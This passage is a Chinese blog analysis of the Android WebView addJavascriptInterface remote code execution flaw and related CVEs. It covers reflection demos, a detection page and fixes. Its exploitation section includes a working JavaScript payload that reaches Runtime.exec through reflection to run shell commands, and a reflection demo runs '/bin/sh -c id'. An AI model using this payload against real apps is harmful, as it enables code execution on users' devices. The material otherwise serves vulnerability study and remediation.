class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JsObject</span> &#123;<br>   <span class="hljs-meta">@JavascriptInterface</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;injectedObject&quot;</span>; &#125;<br>&#125;<br><br>webView.addJavascriptInterface(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JsObject</span>(), <span class="hljs-string">&quot;injectedObject&quot;</span>);<br>webView.loadData(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;text/html&quot;</span>, <span class="hljs-literal">null</span>);<br>webView.loadUrl(<span class="hljs-string">&quot;javascript:alert(injectedObject.toString())&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">This method can be used <span class="hljs-keyword">to</span> allow JavaScript <span class="hljs-keyword">to</span> control the host application. <br>This <span class="hljs-built_in">is</span> a powerful feature, but also presents a security risk <span class="hljs-keyword">for</span> apps targeting<br>JELLY_BEAN <span class="hljs-built_in">or</span> earlier. Apps that target a version later than JELLY_BEAN are still<br>vulnerable <span class="hljs-keyword">if</span> the app runs <span class="hljs-keyword">on</span> a device running Android earlier than <span class="hljs-number">4.2</span>. The <br>most secure way <span class="hljs-keyword">to</span> use this method <span class="hljs-built_in">is</span> <span class="hljs-keyword">to</span> target JELLY_BEAN_MR1 <span class="hljs-built_in">and</span> <span class="hljs-keyword">to</span> ensure the<br>method <span class="hljs-built_in">is</span> called only <span class="hljs-keyword">when</span> running <span class="hljs-keyword">on</span> Android <span class="hljs-number">4.2</span> <span class="hljs-built_in">or</span> later. <span class="hljs-keyword">With</span> these older <br>versions, JavaScript could use reflection <span class="hljs-keyword">to</span> access an injected <span class="hljs-type">object</span><span class="hljs-comment">&#x27;s public</span><br>fields. Use <span class="hljs-keyword">of</span> this method <span class="hljs-keyword">in</span> a WebView containing untrusted content could allow<br>an attacker <span class="hljs-keyword">to</span> manipulate the host application <span class="hljs-keyword">in</span> unintended ways, executing <br>Java code <span class="hljs-keyword">with</span> the permissions <span class="hljs-keyword">of</span> the host application. Use extreme care <span class="hljs-keyword">when</span> <br><span class="hljs-keyword">using</span> this method <span class="hljs-keyword">in</span> a WebView which could contain untrusted content.<br>JavaScript interacts <span class="hljs-keyword">with</span> Java <span class="hljs-type">object</span> <span class="hljs-keyword">on</span> a <span class="hljs-keyword">private</span>, background thread <span class="hljs-keyword">of</span> this <br>WebView. Care <span class="hljs-built_in">is</span> therefore required <span class="hljs-keyword">to</span> maintain thread safety.<br><br>The Java <span class="hljs-type">object</span><span class="hljs-comment">&#x27;s fields are not accessible.</span><br><span class="hljs-keyword">For</span> applications targeted <span class="hljs-keyword">to</span> API level LOLLIPOP <span class="hljs-built_in">and</span> above, methods <span class="hljs-keyword">of</span> injected <br>Java objects are enumerable <span class="hljs-keyword">from</span> JavaScript. Parameters <span class="hljs-type">object</span> the Java <span class="hljs-type">object</span> <br><span class="hljs-keyword">to</span> inject <span class="hljs-keyword">into</span> this WebView<span class="hljs-comment">&#x27;s JavaScript context. Null values are ignored.</span><br>name  the name used <span class="hljs-keyword">to</span> expose the <span class="hljs-type">object</span> <span class="hljs-keyword">in</span> JavaScript<br></code></pre></td></tr></table></figure><p>  之所以提供addJavascriptInterface是为了WebView中的Javascript可以和本地的App<br>  通讯，这确实是一个很强大的功能，这么做的好处在于本地App逻辑不变的情况下，不<br>  需要升级App就可以对程序进行更新，修改相应的Web页面就可以了。</p><h2 id="☆-相关知识"><a href="#☆-相关知识" class="headerlink" title="☆ 相关知识"></a>☆ 相关知识</h2><h3 id="WebView的使用方法"><a href="#WebView的使用方法" class="headerlink" title="WebView的使用方法"></a>WebView的使用方法</h3><p>  在layout中定义 <webview>, 在Activity的onCreate中加入下面的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebView</span> <span class="hljs-variable">webview</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebView</span>(<span class="hljs-built_in">this</span>);<br>setContentView(webview);<br>webview.loadUrl(<span class="hljs-string">&quot;http://slashdot.org/&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h3><p>  反射是java语言提供的一种机制，使Java程序可以在运行时检查类、接口、方法和成员，<br>而不需要在编译的时候知道类的名字和方法等细节信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> Reflect;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a1</span><span class="hljs-params">()</span> &#123;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a2</span><span class="hljs-params">()</span> &#123;<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">hello</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    Demo demo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">mObjectClass</span> <span class="hljs-operator">=</span> demo.getClass();<br><br>    System.out.println(mObjectClass.getName());<br><br>    Method[] methods = mObjectClass.getMethods();<br>    <span class="hljs-keyword">for</span>(Method method : methods)&#123;<br>        System.out.println(<span class="hljs-string">&quot;method = &quot;</span> + method.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> mObjectClass.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> m.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> obj.getClass();<br>        String[] array = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;id &gt; /tmp/id&quot;</span>&#125;;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> c2.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, array.getClass());<br>        n.invoke(obj, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;array&#125;);<br><br>    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>        System.out.println(e.toString());<br>    &#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&gt; javac -d . Reflect/hello.java<br>&gt; java Reflect.hello<br><br>Reflect.Demo<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> a2<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> a1<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> wait<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> wait<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> wait<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> equals<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> toString<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> hashCode<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> getClass<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> notify<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> notifyAll<br></code></pre></td></tr></table></figure><p>命令执行成功。</p><h3 id="通过reflection-访问private"><a href="#通过reflection-访问private" class="headerlink" title="通过reflection 访问private"></a>通过reflection 访问private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> Reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a1</span><span class="hljs-params">()</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;I am a1&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a2</span><span class="hljs-params">()</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;I am a2&quot;</span>);<br>&#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">hello</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    Demo demo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">mObjectClass</span> <span class="hljs-operator">=</span> demo.getClass();<br><br>    System.out.println(mObjectClass.getName());<br><br>    Method[] methods = mObjectClass.getDeclaredMethods();<br>    <span class="hljs-keyword">for</span>(Method method : methods)&#123;<br>        System.out.println(<span class="hljs-string">&quot;method = &quot;</span> + method.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> mObjectClass.newInstance();<br>        methods[<span class="hljs-number">0</span>].setAccessible(<span class="hljs-literal">true</span>);<br>        methods[<span class="hljs-number">0</span>].invoke(o);<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>    &#125;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">&gt; javac -d . Reflect/hello.java<br>&gt; java Reflect.hello<br><br>Reflect.Demo<br><span class="hljs-keyword">method</span> = <span class="hljs-title function_">a1</span><br><span class="hljs-title function_">method</span> = <span class="hljs-title function_">a2</span><br><span class="hljs-title function_">I</span> <span class="hljs-title function_">am</span> <span class="hljs-title function_">a1</span><br></code></pre></td></tr></table></figure><p>已经成功调用了Demo的private a1 方法</p><h2 id="☆-相关漏洞"><a href="#☆-相关漏洞" class="headerlink" title="☆  相关漏洞"></a>☆  相关漏洞</h2><h3 id="CVE-2013-4710"><a href="#CVE-2013-4710" class="headerlink" title="CVE-2013-4710"></a>CVE-2013-4710</h3><p>Disney Mobile、eAccess、KDDI、NTT DOCOMO、SoftBank设备上的Android 3.0至4.1.x版<br>本中存在安全漏洞，该漏洞源于程序没有正确实现WebView类。远程攻击者可借助特制的网<br>页利用该漏洞执行任意Java对象的方法或造成拒绝服务（重启）</p><h3 id="CVE-2012-6636-关键的CVE"><a href="#CVE-2012-6636-关键的CVE" class="headerlink" title="CVE-2012-6636  (关键的CVE)"></a>CVE-2012-6636  (关键的CVE)</h3><p>该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可<br>通过使用Java Reflection 利用该漏洞执行任意Java对象的方法。影响使用 API Level 16<br>以及之前的Android 系统。(Android 4.2 为 API Level 17)</p><h3 id="CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean"><a href="#CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean" class="headerlink" title="CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean"></a>CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean</h3><p>此漏洞公布了一个可利用的Java Object “searchBoxJavaBridge_”</p><h3 id="CVE-2014-7224"><a href="#CVE-2014-7224" class="headerlink" title="CVE-2014-7224"></a>CVE-2014-7224</h3><p>根据 android&#x2F;webkit&#x2F;AccessibilityInjector.java 代码中的介绍，发现当系统辅助<br>功能中的任意一项服务被开启后，所有由系统提供的WebView都会被加入两个JS objects，<br>分别为是”accessibility”  和 “accessibilityTraversal”。如果APP使用了系统的WebView<br>并且设置了setJavaScriptEnabled()，那么恶意攻击者就可以使用”accessibility” 和<br>“accessibilityTraversal” 这两个Java Bridge来执行远程攻击代码</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>   这些CVE中最核心的是CVE-2012-6636, 出现的问题是接口定义问题。是非常经典的<br>do a 变成 do b 的例子，后面的修复方法也是保证了do a 就是 do a。</p><h2 id="☆-漏洞检测"><a href="#☆-漏洞检测" class="headerlink" title="☆ 漏洞检测"></a>☆ 漏洞检测</h2><p>   使用WebView访问下面页面，输出的接口名称则存在漏洞。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>WebView漏洞检测<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0,</span></span><br><span class="hljs-string"><span class="hljs-tag">maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> obj <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>) </span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;getClass&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>[obj]) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">window</span>[obj].<span class="hljs-title function_">getClass</span>();</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="hljs-string">&#x27;&lt;/span&gt;&#x27;</span>);</span><br><span class="language-javascript">                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>);</span><br><span class="language-javascript">                &#125;<span class="hljs-keyword">catch</span>(e)&#123;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125; <span class="hljs-keyword">catch</span>(e) &#123;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title function_">check</span>();</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>   现代浏览器都实现基本一致的BOM，使得JavaScript和浏览器进行消息传递。<br>   是否有getClass的方法，可以作为检测WebView漏洞依据。</p><p>   在Android 4.1.1 原生系统上测试，在默认配置下，存在 searchBoxJavaBridge_<br>   可以利用，CVE-2014-7224上的两个接口，并没有成功暴露。看了源代码后发现必须<br>   打开Accessibility 设置中的Enhance Web accessibility 才会暴露这个两个接口，<br>   因此CVE-2014-7224的影响并不像想象中的那么大。</p><h2 id="☆-漏洞利用的方法"><a href="#☆-漏洞利用的方法" class="headerlink" title="☆ 漏洞利用的方法"></a>☆ 漏洞利用的方法</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">cmd</span>)&#123;</span><br><span class="language-javascript">  <span class="hljs-keyword">return</span></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">jsinterface</span>.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">forName</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).<span class="hljs-title function_">getMethod</span>(<span class="hljs-string">&#x27;getRuntime&#x27;</span>,<span class="hljs-literal">null</span>).<span class="hljs-title function_">invoke</span>(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>).<span class="hljs-title function_">exec</span>(cmd);</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title function_">execute</span>([<span class="hljs-string">&#x27;/system/bin/sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;echo \&quot;mwr\&quot; &gt; /mnt/sdcard/mwr.txt&#x27;</span>]);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>   jsinterface是导出的Java对象， 测试成功，权限是app 的用户权限。</p><h2 id="☆-修复方法和现状"><a href="#☆-修复方法和现状" class="headerlink" title="☆ 修复方法和现状"></a>☆ 修复方法和现状</h2><p>   Google宣布不为小于Android 4.4 的系统提供WebView补丁, 具体可以参见链接：</p><p><a href="https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior">https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior</a></p><p>   要解决WebView的RCE漏洞，比较靠谱的方法是升级Android系统，至少要升级到<br>   API level 17 (Android 4.2), WebView 除了最严重的RCE漏洞，还有各种SOP漏洞，所<br>   以至少要升级到Android 4.4才能保证安全，小于Android 4.4 Google不提供补丁。<br>   Android 4.4 以后使用以chrome为基础的WebView。</p><p>   升级系统API level 17后，只有显示添加 @JavascriptInterface的方法才能被JavaScript<br>   调用，这样反射就失去作用了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">removeJavascriptInterface(<span class="hljs-string">&quot;accessibility&quot;</span>);<br>removeJavascriptInterface(<span class="hljs-string">&quot;accessibilityTraversal&quot;</span>);<br>removeJavascriptInterface(<span class="hljs-string">&quot;searchBoxJavaBridge_&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="☆-参考链接"><a href="#☆-参考链接" class="headerlink" title="☆ 参考链接"></a>☆ 参考链接</h2><ul><li><a href="http://developer.android.com/guide/webapps/webview.html">http://developer.android.com/guide/webapps/webview.html</a></li><li><a href="http://developer.android.com/reference/android/webkit/WebView.html">http://developer.android.com/reference/android/webkit/WebView.html</a></li><li><a href="https://daoyuan14.github.io/news/newattackvector.html">https://daoyuan14.github.io/news/newattackvector.html</a></li><li><a href="http://droidsploit.baidu.com/view/14100201.html">http://droidsploit.baidu.com/view/14100201.html</a></li><li><a href="http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html">http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html</a></li><li><a href="http://tutorials.jenkov.com/java-reflection/index.html">http://tutorials.jenkov.com/java-reflection/index.html</a></li><li><a href="http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html">http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html</a></li><li><a href="http://www.programcreek.com/2013/09/java-reflection-tutorial/">http://www.programcreek.com/2013/09/java-reflection-tutorial/</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/">https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/</a></li><li><a href="https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/">https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/</a></li></ul><h2 id="☆-思考"><a href="#☆-思考" class="headerlink" title="☆ 思考"></a>☆ 思考</h2><p>   WebView 中还提供了一个方法让我们可以获得控制的机会</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldOverrideUrlLoading</span><span class="hljs-params">(WebView view, String url)</span> &#123;<br>  <span class="hljs-keyword">if</span> (url.substring(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>).equalsIgnoreCase(<span class="hljs-string">&quot;yourscheme:&quot;</span>)) &#123;<br>    <span class="hljs-comment">// parse the URL object and execute functions</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>   如果使用上面的代码，在网页的javascript中添加下面的代码，就可以进入后面的解析<br>   URL流程，如果后续代码没有进行严格的检查可能会有一些其他的安全问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-attr">yourscheme</span>:<span class="hljs-comment">//method?parameter=value</span><br></code></pre></td></tr></table></figure><p>Google对这个方法的解释如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Give the host application a chance <span class="hljs-keyword">to</span> take <span class="hljs-keyword">over</span> the control <span class="hljs-keyword">when</span> a <span class="hljs-built_in">new</span> url <br><span class="hljs-keyword">is</span> about <span class="hljs-keyword">to</span> be loaded <span class="hljs-keyword">in</span> the <span class="hljs-keyword">current</span> WebView. <span class="hljs-keyword">If</span> WebViewClient <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <br>provided, <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span> WebView will ask Activity Manager <span class="hljs-keyword">to</span> choose the proper <br><span class="hljs-keyword">handler</span> <span class="hljs-keyword">for</span> the url. <span class="hljs-keyword">If</span> WebViewClient <span class="hljs-keyword">is</span> provided, <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span> means the <br>host application handles the url, <span class="hljs-keyword">while</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span> means the <span class="hljs-keyword">current</span> <br>WebView handles the url. This <span class="hljs-keyword">method</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">called</span> <span class="hljs-keyword">for</span> requests <span class="hljs-keyword">using</span> <br>the POST &quot;method&quot;.<br></code></pre></td></tr></table></figure><p>其实就是当WebView加载新的URL时给App程序一个控制的机会，这还是有一些想象空间的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fedora 安装 vnc server</title>
    <link href="/cn/vnc/"/>
    <url>/cn/vnc/</url>
    
